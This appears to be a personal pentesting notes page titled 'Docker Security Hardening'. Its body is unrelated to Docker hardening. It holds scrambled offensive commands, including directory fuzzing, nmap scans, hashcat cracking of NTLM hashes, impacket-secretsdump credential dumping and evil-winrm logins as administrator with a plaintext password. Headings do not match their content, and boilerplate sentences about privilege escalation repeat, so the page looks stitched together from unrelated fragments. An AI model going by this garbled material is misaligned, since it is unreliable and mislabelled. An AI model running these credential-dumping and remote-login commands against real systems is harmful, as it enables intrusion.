---
TitleSEO: "Docker Security Hardening | ZureFX"
TitlePost: "Docker Security Hardening"
Author: "ZureFX"
Description: "Personal notes on Docker Security Hardening. Quick reference for pentesting and CTF challenges."
Keywords: "linux, lateral movement, blue team, windows"
URL: "https://zurefx.github.io/notes/note-docker-security-hardening-474.html"
URL_IMAGES: ""
Date: "2024-09-17"
Tags: "Linux, Lateral Movement, Blue Team, Windows"
Section: "notes"
Lang: "en"
main_img: "note-docker-security-hardening-474"
Permalink: "/notes/note-docker-security-hardening-474.html"
BtnLabel: "Read Notes"
Pick: 0
---
## sharphound

### Open Redirect

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.117.203.196/FUZZ
```

```bash
feroxbuster -h
```

## msfvenom

### Ubuntu 20.04

```bash
nmap -sCV -p8080,5986,110 10.96.157.185 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p464,25,9200 10.93.75.249 -oN scan.txt
nmap -sCV -p8443,1433,8080 10.22.205.2 -oN scan.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Flask

### lookupsid

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.15.184.190
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.186.29
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.128.110.249/FUZZ
evil-winrm -i 10.78.33.248 -u administrator -p 'P@ssw0rd!'
```

## Redis

### chisel

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files.

Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation.

## NFS

### SSH

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service. The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible.

- `Open Redirect`
- `chisel`
- `sharphound`
- `kerbrute`

> **Note:** SUID Binary was identified as the primary attack vector in this scenario.

Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.
